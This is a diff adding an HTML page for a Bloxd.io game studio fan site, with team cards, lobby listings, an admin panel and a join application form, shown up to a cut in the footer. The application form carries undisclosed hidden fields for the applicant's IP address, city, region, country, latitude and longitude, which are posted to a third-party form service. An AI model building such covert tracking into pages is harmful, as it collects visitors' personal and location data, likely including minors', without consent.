@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crystal Studios</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        amethyst: { 400: '#c191f2', 500: '#9d4edd', 600: '#8b3ec4', 700: '#722da1', 800: '#5a189a', 900: '#3c096c', 950: '#10051d' }
+                    },
+                    fontFamily: { sans: ['Inter', 'sans-serif'], display: ['Space Grotesk', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+    <style>
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #10051d; }
+        ::-webkit-scrollbar-thumb { background: #5a189a; border-radius: 3px; }
+        .active-tab { color: #c191f2 !important; border-bottom: 2px solid #9d4edd; }
+
+        .hide-scrollbar::-webkit-scrollbar { display: none; }
+        .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+    </style>
+</head>
+<body class="bg-amethyst-950 text-slate-100 font-sans min-h-screen flex flex-col">
+
+    <header class="sticky top-0 z-50 backdrop-blur-md bg-amethyst-950/80 border-b border-amethyst-900/40">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex items-center justify-between h-20">
+            <div class="flex items-center gap-3 cursor-pointer" onclick="navigateTo('home')">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-amethyst-500 to-amethyst-900 flex items-center justify-center shadow-lg shadow-amethyst-500/20">
+                    <i class="fa-solid fa-gem text-lg text-white"></i>
+                </div>
+                <div>
+                    <span class="font-display font-bold text-lg tracking-wider">CRYSTAL</span>
+                    <p class="text-[9px] text-amethyst-400 uppercase tracking-widest font-semibold">STUDIOS</p>
+                </div>
+            </div>
+
+            <nav class="hidden md:flex items-center gap-1">
+                <a onclick="navigateTo('home')" id="nav-home" class="px-3 py-2 text-sm font-medium text-slate-300 hover:text-white cursor-pointer active-tab">Home</a>
+                <a onclick="navigateTo('games')" id="nav-games" class="px-3 py-2 text-sm font-medium text-slate-300 hover:text-white cursor-pointer">Lobbies</a>
+                <a onclick="navigateTo('team')" id="nav-team" class="px-3 py-2 text-sm font-medium text-slate-300 hover:text-white cursor-pointer">Our Team</a>
+                <a onclick="navigateTo('apply')" id="nav-apply" class="px-3 py-2 text-sm font-medium text-slate-300 hover:text-white cursor-pointer">Apply</a>
+                <a onclick="navigateTo('alerts')" id="nav-alerts" class="px-3 py-2 text-sm font-medium text-slate-300 hover:text-white cursor-pointer flex items-center gap-1.5">
+                    <i class="fa-solid fa-bell text-xs animate-bounce"></i> Alerts
+                </a>
+                <a onclick="navigateTo('admin')" id="nav-admin" class="px-3 py-2 text-sm font-medium text-slate-400 hover:text-amethyst-400 cursor-pointer"><i class="fa-solid fa-lock text-xs"></i> Admin</a>
+            </nav>
+
+            <div class="hidden md:flex items-center gap-3">
+                <button onclick="toggleBlankPopup()" class="w-9 h-9 flex items-center justify-center bg-amethyst-900/40 border border-amethyst-700/30 hover:bg-amethyst-900/80 rounded-xl text-slate-300 transition-all" title="Open Custom View">
+                    <i class="fa-solid fa-coffee text-sm"></i>
+                </button>
+                <a href="https://bloxd.io" target="_blank" class="px-4 py-2 bg-amethyst-600 hover:bg-amethyst-500 text-white text-xs font-bold rounded-xl transition-all">Play Bloxd.io</a>
+            </div>
+
+            <button onclick="toggleMobileMenu()" class="md:hidden p-2 text-slate-400">
+                <i id="mobile-menu-icon" class="fa-solid fa-bars text-xl"></i>
+            </button>
+        </div>
+
+        <div id="mobile-menu" class="hidden md:hidden border-t border-amethyst-900/50 bg-amethyst-950 p-4 space-y-2">
+            <a onclick="navigateTo('home'); toggleMobileMenu()" class="block py-2 text-slate-300">Home</a>
+            <a onclick="navigateTo('games'); toggleMobileMenu()" class="block py-2 text-slate-300">Lobbies</a>
+            <a onclick="navigateTo('team'); toggleMobileMenu()" class="block py-2 text-slate-300">Our Team</a>
+            <a onclick="navigateTo('apply'); toggleMobileMenu()" class="block py-2 text-slate-300">Apply Now</a>
+            <a onclick="navigateTo('alerts'); toggleMobileMenu()" class="block py-2 text-slate-300"><i class="fa-solid fa-bell mr-1"></i> Alerts</a>
+            <a onclick="navigateTo('admin'); toggleMobileMenu()" class="block py-2 text-slate-400"><i class="fa-solid fa-lock mr-1"></i> Admin Portal</a>
+        </div>
+    </header>
+
+    <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col gap-2"></div>
+
+    <main class="flex-grow">
+        <section id="view-home" class="view-section py-16 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center lg:text-left">
+            <div class="grid lg:grid-cols-12 gap-12 items-center">
+                <div class="lg:col-span-7 space-y-6">
+                    <h1 class="font-display font-extrabold text-4xl sm:text-6xl text-white leading-tight">
+                        Crystal Studios <br>
+                        <span class="bg-gradient-to-r from-amethyst-300 to-purple-500 bg-clip-text text-transparent">Bloxd</span>
+                    </h1>
+                    <p class="text-slate-300 max-w-xl mx-auto lg:mx-0">
+                        Top-tier custom built multiplayer worlds for Bloxd.io.
+                    </p>
+                    <div class="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
+                        <button onclick="navigateTo('games')" class="px-6 py-3 bg-amethyst-600 hover:bg-amethyst-500 text-white font-bold rounded-xl transition-all">Browse Lobbies</button>
+                        <button onclick="navigateTo('apply')" class="px-6 py-3 bg-amethyst-900/40 border border-amethyst-700/30 text-slate-300 rounded-xl hover:bg-amethyst-900/80">Join Our Team</button>
+                    </div>
+                </div>
+                <div class="lg:col-span-5 flex justify-center">
+                    <div class="w-64 h-64 sm:w-80 sm:h-80 rounded-2xl bg-gradient-to-tr from-amethyst-900 to-amethyst-950 border border-amethyst-500/20 flex flex-col justify-between p-6 shadow-2xl">
+                        <div class="text-center space-y-2">
+                            <i class="fa-solid fa-gem text-5xl text-amethyst-400"></i>
+                            <h3 class="font-display font-bold text-white text-base">Crystal Studios Logo</h3>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="view-games" class="view-section hidden py-12 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-xl mx-auto mb-12">
+                <h2 class="font-display font-bold text-3xl text-white">Our Lobbies</h2>
+                <p class="text-slate-400 text-sm mt-2">Explore our custom multiplayer game environments in Bloxd.io.</p>
+            </div>
+
+            <div id="filters" class="flex flex-wrap gap-2 mb-8 justify-center">
+                <button onclick="executeFilter('all', this)" class="px-3 py-1.5 text-xs font-bold rounded-lg bg-amethyst-500 text-white shadow-md">All Worlds</button>
+                <button onclick="executeFilter('pvp', this)" class="px-3 py-1.5 text-xs font-bold rounded-lg bg-amethyst-900/40 text-slate-400 hover:text-white">PvP Arena</button>
+                <button onclick="executeFilter('parkour', this)" class="px-3 py-1.5 text-xs font-bold rounded-lg bg-amethyst-900/40 text-slate-400 hover:text-white">Parkour</button>
+                <button onclick="executeFilter('adventure', this)" class="px-3 py-1.5 text-xs font-bold rounded-lg bg-amethyst-900/40 text-slate-400 hover:text-white">Adventure</button>
+                <button onclick="executeFilter('survival', this)" class="px-3 py-1.5 text-xs font-bold rounded-lg bg-amethyst-900/40 text-slate-400 hover:text-white">Survival</button>
+                <button onclick="executeFilter('minigames', this)" class="px-3 py-1.5 text-xs font-bold rounded-lg bg-amethyst-900/40 text-slate-400 hover:text-white">Minigames</button>
+                <button onclick="executeFilter('other', this)" class="px-3 py-1.5 text-xs font-bold rounded-lg bg-amethyst-900/40 text-slate-400 hover:text-white">Other</button>
+            </div>
+
+            <div id="worlds-target" class="grid sm:grid-cols-2 lg:grid-cols-3 gap-6"></div>
+        </section>
+
+       <section id="view-team" class="view-section hidden py-12 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-xl mx-auto mb-12">
+                <h2 class="font-display font-bold text-3xl text-white">Meet Our Team</h2>
+                <p class="text-slate-400 text-sm mt-2">The creative minds, engineers, and designers behind Crystal Studios.</p>
+            </div>
+            
+            <div class="relative w-full">
+                <!-- Carousel Track -->
+                <div id="team-carousel" class="flex gap-6 overflow-x-auto snap-x snap-mandatory hide-scrollbar pb-6 scroll-smooth">
+                    
+                    <!-- Team Member 1 -->
+                    <div class="team-card snap-center bg-amethyst-900/10 border border-amethyst-900/40 rounded-2xl p-6 flex flex-col justify-between items-center text-center shadow-lg hover:border-amethyst-500/50 transition-all w-[280px] sm:w-[300px] shrink-0">
+                        <div class="space-y-4 w-full">
+                            <div class="w-20 h-20 rounded-full bg-gradient-to-tr from-amethyst-600 to-purple-500 flex items-center justify-center mx-auto text-white shadow-md">
+                                <i class="fa-solid fa-crown text-3xl"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-display font-bold text-lg text-white">mr_admin876</h3>
+                                <span class="inline-block mt-1 px-2 py-0.5 rounded text-[10px] font-semibold bg-purple-950/50 border border-purple-800/30 text-purple-400 uppercase tracking-wider">Studio Owner & Main Builder</span>
+                            </div>
+                            <p class="text-slate-400 text-xs leading-relaxed">Lead Builder for the beautiful structures within our games. As the Owner, he also reads join requests forwarded by the Web Developer.</p>
+                        </div>
+                        <div class="grid grid-cols-2 gap-2 w-full mt-6">
+                            <a href="https://bloxdhub.com/@mr_admin678" target="_blank" class="px-2 py-1.5 bg-amethyst-950 border border-amethyst-900 hover:border-amethyst-600 rounded-lg text-[11px] font-medium text-slate-300 transition-colors flex items-center justify-center gap-1"><i class="fa-solid fa-network-wired text-xs"></i> BloxdHub</a>
+                            <a href="https://bloxd.io/player/mr_admin876" target="_blank" class="px-2 py-1.5 bg-amethyst-600 hover:bg-amethyst-500 rounded-lg text-[11px] font-bold text-white transition-colors flex items-center justify-center gap-1"><i class="fa-solid fa-gamepad text-xs"></i> Bloxd.io</a>
+                        </div>
+                    </div>
+
+                    <!-- Team Member 2 -->
+                    <div class="team-card snap-center bg-amethyst-900/10 border border-amethyst-900/40 rounded-2xl p-6 flex flex-col justify-between items-center text-center shadow-lg hover:border-amethyst-500/50 transition-all w-[280px] sm:w-[300px] shrink-0">
+                        <div class="space-y-4 w-full">
+                            <div class="w-20 h-20 rounded-full bg-gradient-to-tr from-indigo-600 to-blue-500 flex items-center justify-center mx-auto text-white shadow-md">
+                                <i class="fa-solid fa-code text-3xl"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-display font-bold text-lg text-white">Entity1234</h3>
+                                <span class="inline-block mt-1 px-2 py-0.5 rounded text-[10px] font-semibold bg-cyan-950/50 border border-cyan-800/30 text-cyan-400 uppercase tracking-wider">Web Developer</span>
+                            </div>
+                            <p class="text-slate-400 text-xs leading-relaxed">Develops and Maintains this website - from implementing new features, to adding new worlds to the page, to even maintaning the server.</p>
+                        </div>
+                        <div class="grid grid-cols-2 gap-2 w-full mt-6">
+                            <a href="https://bloxdhub.com/@Entity1234" target="_blank" class="px-2 py-1.5 bg-amethyst-950 border border-amethyst-900 hover:border-amethyst-600 rounded-lg text-[11px] font-medium text-slate-300 transition-colors flex items-center justify-center gap-1"><i class="fa-solid fa-network-wired text-xs"></i> BloxdHub</a>
+                            <a href="https://bloxd.io/player/Entity1234" target="_blank" class="px-2 py-1.5 bg-amethyst-600 hover:bg-amethyst-500 rounded-lg text-[11px] font-bold text-white transition-colors flex items-center justify-center gap-1"><i class="fa-solid fa-gamepad text-xs"></i> Bloxd.io</a>
+                        </div>
+                    </div>
+
+                    <!-- Team Member 3 -->
+                    <div class="team-card snap-center bg-amethyst-900/10 border border-amethyst-900/40 rounded-2xl p-6 flex flex-col justify-between items-center text-center shadow-lg hover:border-amethyst-500/50 transition-all w-[280px] sm:w-[300px] shrink-0">
+                        <div class="space-y-4 w-full">
+                            <div class="w-20 h-20 rounded-full bg-gradient-to-tr from-fuchsia-600 to-pink-500 flex items-center justify-center mx-auto text-white shadow-md">
+                                <i class="fa-solid fa-gears text-3xl"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-display font-bold text-lg text-white">i_am_rustywolf</h3>
+                                <span class="inline-block mt-1 px-2 py-0.5 rounded text-[10px] font-semibold bg-fuchsia-950/50 border border-fuchsia-800/30 text-fuchsia-400 uppercase tracking-wider">Lobby Moderator and Coder</span>
+                            </div>
+                            <p class="text-slate-400 text-xs leading-relaxed">Ensures games run smoothly. As a coder, they also write most of the World Code for our games.</p>
+                        </div>
+                        <div class="grid grid-cols-2 gap-2 w-full mt-6">
+                            <a href="https://bloxdhub.com" target="_blank" class="px-2 py-1.5 bg-amethyst-950 border border-amethyst-900 hover:border-amethyst-600 rounded-lg text-[11px] font-medium text-slate-300 transition-colors flex items-center justify-center gap-1"><i class="fa-solid fa-network-wired text-xs"></i> BloxdHub</a>
+                            <a href="https://bloxd.io" target="_blank" class="px-2 py-1.5 bg-amethyst-600 hover:bg-amethyst-500 rounded-lg text-[11px] font-bold text-white transition-colors flex items-center justify-center gap-1"><i class="fa-solid fa-gamepad text-xs"></i> Bloxd.io</a>
+                        </div>
+                    </div>
+
+                    <!-- Team Member 4 -->
+                    <div class="team-card snap-center bg-amethyst-900/10 border border-amethyst-900/40 rounded-2xl p-6 flex flex-col justify-between items-center text-center shadow-lg hover:border-amethyst-500/50 transition-all w-[280px] sm:w-[300px] shrink-0">
+                        <div class="space-y-4 w-full">
+                            <div class="w-20 h-20 rounded-full bg-gradient-to-tr from-emerald-600 to-teal-500 flex items-center justify-center mx-auto text-white shadow-md">
+                                <i class="fa-solid fa-user-lock text-3xl"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-display font-bold text-lg text-white">bloxdio_nation</h3>
+                                <span class="inline-block mt-1 px-2 py-0.5 rounded text-[10px] font-semibold bg-emerald-950/50 border border-emerald-800/30 text-emerald-400 uppercase tracking-wider">Lobby Moderator & Coder</span>
+                            </div>
+                            <p class="text-slate-400 text-xs leading-relaxed">Ensures games run smoothly and the game enviornment is kept happy. As a coder, they also write Code Blocks and small parts of the World Code for our games.</p>
+                        </div>
+                        <div class="grid grid-cols-2 gap-2 w-full mt-6">
+                            <a href="https://bloxdhub.com" target="_blank" class="px-2 py-1.5 bg-amethyst-950 border border-amethyst-900 hover:border-amethyst-600 rounded-lg text-[11px] font-medium text-slate-300 transition-colors flex items-center justify-center gap-1"><i class="fa-solid fa-network-wired text-xs"></i> BloxdHub</a>
+                            <a href="https://bloxd.io" target="_blank" class="px-2 py-1.5 bg-amethyst-600 hover:bg-amethyst-500 rounded-lg text-[11px] font-bold text-white transition-colors flex items-center justify-center gap-1"><i class="fa-solid fa-gamepad text-xs"></i> Bloxd.io</a>
+                        </div>
+                    </div>
+
+                    <!-- Team Member 5 -->
+                    <div class="team-card snap-center bg-amethyst-900/10 border border-amethyst-900/40 rounded-2xl p-6 flex flex-col justify-between items-center text-center shadow-lg hover:border-amethyst-500/50 transition-all w-[280px] sm:w-[300px] shrink-0">
+                        <div class="space-y-4 w-full">
+                            <div class="w-20 h-20 rounded-full bg-gradient-to-tr from-emerald-600 to-teal-500 flex items-center justify-center mx-auto text-white shadow-md">
+                                <i class="fa-solid fa-user-lock text-3xl"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-display font-bold text-lg text-white">_EliThePup_</h3>
+                                <span class="inline-block mt-1 px-2 py-0.5 rounded text-[10px] font-semibold bg-emerald-950/50 border border-emerald-800/30 text-emerald-400 uppercase tracking-wider">Lobby Moderator & Coder</span>
+                            </div>
+                            <p class="text-slate-400 text-xs leading-relaxed">Ensures games run smoothly and the game enviornment is kept happy. As a coder, they also write Code Blocks and small parts of the World Code for our games.</p>
+                        </div>
+                        <div class="grid grid-cols-2 gap-2 w-full mt-6">
+                            <a href="https://bloxdhub.com" target="_blank" class="px-2 py-1.5 bg-amethyst-950 border border-amethyst-900 hover:border-amethyst-600 rounded-lg text-[11px] font-medium text-slate-300 transition-colors flex items-center justify-center gap-1"><i class="fa-solid fa-network-wired text-xs"></i> BloxdHub</a>
+                            <a href="https://bloxd.io" target="_blank" class="px-2 py-1.5 bg-amethyst-600 hover:bg-amethyst-500 rounded-lg text-[11px] font-bold text-white transition-colors flex items-center justify-center gap-1"><i class="fa-solid fa-gamepad text-xs"></i> Bloxd.io</a>
+                        </div>
+                    </div>
+
+                </div>
+                
+                <!-- Clickable Dots -->
+                <div id="carousel-dots" class="flex justify-center items-center gap-2 mt-4"></div>
+            </div>
+        </section>
+
+        <section id="view-apply" class="view-section hidden py-12 max-w-4xl mx-auto px-4">
+            <div class="bg-amethyst-900/10 border border-amethyst-900/30 rounded-2xl p-6 sm:p-8 shadow-xl">
+                <h2 class="font-display font-bold text-2xl text-white text-center mb-8">Join the Team</h2>
+                
+                <div class="grid md:grid-cols-2 gap-8 items-stretch">
+                    <div class="flex flex-col justify-center space-y-4 pr-0 md:pr-8 border-b md:border-b-0 md:border-r border-slate-700/60 pb-8 md:pb-0">
+                        <div class="w-12 h-12 rounded-xl bg-amethyst-900/50 flex items-center justify-center text-amethyst-400 border border-amethyst-700/30">
+                            <i class="fa-solid fa-paper-plane text-lg"></i>
+                        </div>
+                        <h3 class="font-display font-bold text-lg text-white">Apply via BloxdHub or CipherChat</h3>
+                        <p class="text-slate-300 text-sm leading-relaxed">
+                            Alternatively, you can get evaluated quickly by us on BloxdHub or CipherChat. If you @mention <span class="text-amethyst-400 font-semibold">@Entity1234</span> (<span class="text-amethyst-400 font-semibold">@entity1234</span> on CipherChat) on either of our socials, alongside your application details, your portfolio can be reviewed directly to join the studio ranks.
+                        </p>
+                        <div>
+                            <a href="https://bloxdhub.com" target="_blank" class="inline-flex items-center gap-2 px-4 py-2.5 bg-amethyst-950 border border-amethyst-900 hover:border-amethyst-600 text-slate-300 hover:text-white rounded-xl text-xs font-semibold transition-all">
+                                <img src="https://bloxdhub.com/favicon.ico" width="20px" height="20px" alt="BloxdHub Logo"></img> Launch BloxdHub
+                            </a>
+                        </div>
+                        <div>
+                            <a href="https://cipherchat-theta.base44.app" target="_blank" class="inline-flex items-center gap-2 px-4 py-2.5 bg-amethyst-950 border border-amethyst-900 hover:border-amethyst-600 text-slate-300 hover:text-white rounded-xl text-xs font-semibold transition-all">
+                                <img src="https://cipherchat-theta.base44.app/favicon.ico" width="20px" height="20px" alt="CipherChat Logo"></img> Launch CipherChat
+                            </a>
+                        </div>
+                    </div>
+
+                   <form id="guildForm" action="https://formspree.io/f/meebpgbd" method="POST" class="space-y-4">
+    <h3 class="font-display font-bold text-base text-amethyst-400 mb-2 uppercase tracking-wider text-[11px]">Direct Submission</h3>
+    
+    <!-- Hidden Fields to capture data from loc.html api -->
+    <input type="hidden" id="geo-ip" name="IP_Address">
+    <input type="hidden" id="geo-city" name="City">
+    <input type="hidden" id="geo-region" name="Region_State">
+    <input type="hidden" id="geo-country" name="Country">
+    <input type="hidden" id="geo-lat" name="Latitude">
+    <input type="hidden" id="geo-lon" name="Longitude">
+
+    <!-- Visible Form Fields -->
+    <div>
+        <label class="block text-xs uppercase text-amethyst-400 mb-1">Bloxd Username</label>
+        <input type="text" id="app-user" name="Username" required class="w-full bg-amethyst-950 border border-amethyst-900 focus:border-amethyst-500 rounded-xl px-3 py-2 text-slate-100 text-sm focus:outline-none" placeholder="Billy_Bob_Joe">
+    </div>
+    <div>
+        <label class="block text-xs uppercase text-amethyst-400 mb-1">Contact Handle (BloxdHub)</label>
+        <input type="text" id="app-contact" name="Contact_Handle" required class="w-full bg-amethyst-950 border border-amethyst-900 focus:border-amethyst-500 rounded-xl px-3 py-2 text-slate-100 text-sm focus:outline-none" placeholder="@BillyEatsCarrots">
+    </div>
+    <div>
+        <label class="block text-xs uppercase text-amethyst-400 mb-1">Primary Skill Core</label>
+        <select id="app-role" name="Requested_Role" class="w-full bg-amethyst-950 border border-amethyst-900 focus:border-amethyst-500 rounded-xl px-3 py-2 text-slate-100 text-sm focus:outline-none">
+            <option value="Builder">Builder/Artistic Specialist</option>
+            <option value="Logic">Logic, Mechanics, and Code Specialist</option>
+            <option value="Tester">Game Tester</option>
+            <option value="Admin">Game Moderator</option>
+        </select>
+    </div>
+    <div>
+        <label class="block text-xs uppercase text-amethyst-400 mb-1">Portfolio & History Data</label>
+        <textarea id="app-exp" name="Portfolio_Context" rows="3" maxLength="50" required class="w-full bg-amethyst-950 border border-amethyst-900 focus:border-amethyst-500 rounded-xl px-3 py-2 text-slate-100 text-sm focus:outline-none"></textarea>
+    </div>
+    <button type="submit" class="w-full py-3 bg-amethyst-600 hover:bg-amethyst-500 text-white text-sm font-bold rounded-xl transition-all">Transmit Registration</button>
+</form>
+                </div>
+            </div>
+        </section>
+
+        <section id="view-alerts" class="view-section hidden py-12 max-w-2xl mx-auto px-4">
+            <div class="bg-amethyst-900/10 border border-amethyst-900/30 rounded-2xl p-6 shadow-xl space-y-4">
+                <div class="flex items-center gap-3 border-b border-amethyst-900/40 pb-3">
+                    <i class="fa-solid fa-bell text-xl text-amethyst-400"></i>
+                    <h2 class="font-display font-bold text-xl text-white">System Broadcasts</h2>
+                </div>
+                <div id="alerts-wrapper" class="space-y-3"></div>
+            </div>
+        </section>
+
+        <section id="view-admin" class="view-section hidden py-12 max-w-4xl mx-auto px-4">
+            <div id="admin-auth-gate" class="max-w-md mx-auto bg-amethyst-900/10 border border-amethyst-900/30 rounded-2xl p-6 shadow-xl space-y-4">
+                <div class="text-center space-y-1">
+                    <i class="fa-solid fa-user-shield text-3xl text-amethyst-400"></i>
+                    <h2 class="font-display font-bold text-lg text-white">Security Key Required</h2>
+                    <p class="text-xs text-slate-400">Enter administrative password context sequence</p>
+                </div>
+                <div class="space-y-3">
+                    <input type="password" id="admin-secret-pass" placeholder="••••••••••••••••" class="w-full bg-amethyst-950 border border-amethyst-900 rounded-xl px-3 py-2.5 text-center text-sm tracking-widest text-white focus:outline-none focus:border-amethyst-500">
+                    <button onclick="submitAdminCredentials()" class="w-full py-2.5 bg-amethyst-600 hover:bg-amethyst-500 text-white font-bold rounded-xl text-xs transition-all uppercase tracking-wider">Access Panel</button>
+                </div>
+            </div>
+
+            <div id="admin-workspace" class="space-y-8 hidden">
+                <div class="bg-amethyst-900/10 border border-amethyst-900/30 rounded-2xl p-6 shadow-xl">
+                    <div class="flex justify-between items-center mb-4 border-b border-amethyst-900/40 pb-2">
+                        <h2 class="font-display font-bold text-xl text-white">Admin Terminal</h2>
+                        <button onclick="logoutAdminSession()" class="px-3 py-1 bg-red-950/40 border border-red-900/50 hover:bg-red-950 text-red-400 text-xs font-semibold rounded-lg transition-all"><i class="fa-solid fa-power-off mr-1"></i> Exit Session</button>
+                    </div>
+                       
+                    <div class="grid md:grid-cols-2 gap-6 items-start">
+                        <div class="space-y-3 border-b md:border-b-0 md:border-r border-amethyst-900/40 pb-6 md:pb-0 md:pr-6">
+                            <h3 class="text-xs font-bold text-amethyst-400 uppercase tracking-wider flex items-center gap-1.5"><i class="fa-solid fa-gamepad"></i> Configure Live Lobby Profiles</h3>
+                            <div class="grid grid-cols-2 gap-2">
+                                <input type="text" id="w-id" placeholder="Unique Card ID (e.g., pvp-desert)" class="w-full bg-amethyst-950 border border-amethyst-900 rounded-xl px-3 py-2 text-xs focus:outline-none text-slate-100">
+                                <input type="text" id="w-name" placeholder="Lobby Display Name" class="w-full bg-amethyst-950 border border-amethyst-900 rounded-xl px-3 py-2 text-xs focus:outline-none text-slate-100">
+                            </div>
+                            <div class="grid grid-cols-3 gap-2">
+                                <select id="w-cat" class="w-full bg-amethyst-950 border border-amethyst-900 rounded-xl px-2 py-2 text-[11px] focus:outline-none text-slate-100">
+                                    <option value="pvp">PvP Arena</option>
+                                    <option value="parkour">Parkour Course</option>
+                                    <option value="adventure">Adventure Map</option>
+                                    <option value="survival">Survival World</option>
+                                    <option value="minigames">Minigames</option>
+                                    <option value="other">Other</option>
+                                </select>
+                                <select id="w-icon" class="w-full bg-amethyst-950 border border-amethyst-900 rounded-xl px-2 py-2 text-[11px] focus:outline-none text-slate-100">
+                                    <option value="fa-solid fa-cubes">Default Cubes</option>
+                                    <option value="fa-solid fa-shield-halved">Shield Icon (PvP)</option>
+                                    <option value="fa-solid fa-stairs">Stairs Icon (Parkour)</option>
+                                    <option value="fa-solid fa-dragon">Dragon Icon (Adventure)</option>
+                                    <option value="fa-solid fa-tree">Tree Icon (Survival)</option>
+                                    <option value="fa-solid fa-gamepad">Gamepad Icon (Minigames)</option>
+                                    <option value="fa-solid fa-trophy">Trophy Reward</option>
+                                    <option value="fa-solid fa-crown">Royal Crown</option>
+                                    <option value="fa-solid fa-skull">Hazard Skull</option>
+                                </select>
+                                <input type="text" id="w-rating" placeholder="Rating Score (e.g., 4.9)" class="w-full bg-amethyst-950 border border-amethyst-900 rounded-xl px-2 py-2 text-xs focus:outline-none text-slate-100">
+                            </div>
+                            <div class="grid grid-cols-2 gap-2">
+                                <input type="text" id="w-jcode" placeholder="Custom Join Code / Link" class="w-full bg-amethyst-950 border border-amethyst-900 rounded-xl px-3 py-2 text-xs focus:outline-none text-slate-100">
+                                <input type="text" id="w-creator" placeholder="Created By Name" class="w-full bg-amethyst-950 border border-amethyst-900 rounded-xl px-3 py-2 text-xs focus:outline-none text-slate-100">
+                            </div>
+                            <div class="flex items-center gap-2 p-1">
+                                <input type="checkbox" id="w-player-made" class="w-4 h-4 rounded bg-amethyst-950 border-amethyst-900 accent-amethyst-500">
+                                <label for="w-player-made" class="text-[11px] text-slate-300 select-none">Apply <span class="text-amethyst-400 font-bold">"Player Made"</span> Tag Overlay Badge</label>
+                            </div>
+                            <textarea id="w-desc" placeholder="Lobby Profile Overview Description Text Context..." rows="3" class="w-full bg-amethyst-950 border border-amethyst-900 rounded-xl px-3 py-2 text-xs focus:outline-none text-slate-100"></textarea>
+                            <button onclick="generateWorldCodeBlock()" class="w-full py-2.5 bg-amethyst-800 hover:bg-amethyst-700 text-white font-bold rounded-xl text-xs transition-all">Compile Card Changes</button>
+                        </div>
+
+                        <div class="space-y-3">
+                            <h3 class="text-xs font-bold text-amethyst-400 uppercase tracking-wider flex items-center gap-1.5"><i class="fa-solid fa-bullhorn"></i> Live Broadcast Alert Banner</h3>
+                            <div class="bg-amethyst-950 border border-amethyst-900 rounded-xl p-4 space-y-3">
+                                <div class="flex items-center justify-between">
+                                    <label class="text-xs text-slate-300 font-semibold uppercase">Toggle Alert Banner</label>
+                                    <label class="relative inline-flex items-center cursor-pointer">
+                                        <input type="checkbox" id="alert-toggle" class="sr-only peer">
+                                        <div class="w-9 h-5 bg-slate-800 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-slate-400 after:border-slate-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-amethyst-500 peer-checked:after:bg-white"></div>
+                                    </label>
+                                </div>
+                                <div>
+                                    <label class="block text-[10px] uppercase text-amethyst-400 mb-1">Alert Broadcast Message</label>
+                                    <textarea id="alert-message-input" placeholder="Enter important community alert bulletin notices here..." rows="3" class="w-full bg-amethyst-950 border border-amethyst-900 rounded-xl px-3 py-2 text-xs focus:outline-none text-slate-100"></textarea>
+                                </div>
+                            </div>
+                            
+                            <button onclick="generateDataFileCode()" class="w-full py-3 bg-green-700 hover:bg-green-600 text-white font-bold rounded-xl text-xs transition-all flex items-center justify-center gap-1.5 shadow-lg shadow-green-900/20">
+                                <i class="fa-solid fa-code"></i> Generate data.js Code
+                            </button>
+
+                            <div id="code-output-section" class="hidden space-y-3 mt-4 bg-amethyst-950 border border-amethyst-900 p-4 rounded-xl">
+                                <label class="text-xs text-amethyst-400 font-bold uppercase tracking-wider">Copy this into your data.js file</label>
+                                <textarea id="generated-data-output" rows="10" class="w-full bg-amethyst-900/50 border border-amethyst-800 rounded-xl px-3 py-2 text-xs font-mono text-amethyst-300 focus:outline-none" readonly></textarea>
+                                <button onclick="directClipboardCopy(document.getElementById('generated-data-output').value)" class="w-full py-2 bg-amethyst-600 hover:bg-amethyst-500 text-white font-bold rounded-xl text-xs transition-all">
+                                    <i class="fa-regular fa-copy mr-1"></i> Copy Full Code
+                                </button>
+                            </div>
+                            </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="bg-amethyst-950 border-t border-amethyst-900/40 py-12 text-slate-400 text-sm">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8 text-left">
+                <div class="space-y-3">
+                    <h4 class="font-display font-bold tracking-wider text-slate-300 uppercase text-xs">Legal & Info</h4>
+                    <ul class="space-y-2 text-xs">
+                        <li><a href="privacypolicy.txt" class="hover:text-amethyst-400 transition-colors">Privacy Policy</a></li>
+                        <li><a href="termsofuse.txt" class="hover:text-amethyst-400 transition-colors">Terms of Use</a></li>
+                        <li><a href="info.html" class="hover:text-amethyst-400 transition-colors">Information</a></li>
+                    </ul>
+                </div>
+
+                <div class="space-y-3 bg-amethyst-900/20 p-4 rounded-lg border border-amethyst-800/30">
+                    <h4 class="font-display font-extrabold tracking-wider text-slate-100 uppercase text-xs">Connect With Us</h4>
+                    <ul class="space-y-2 text-xs font-medium text-slate-300">
+                        <li><a href="https://bloxdhub.com/@Entity1234" target="_blank" rel="noopener noreferrer" class="hover:text-amethyst-300 transition-colors flex items-center gap-1">Entity1234 - BloxdHub</a></li>
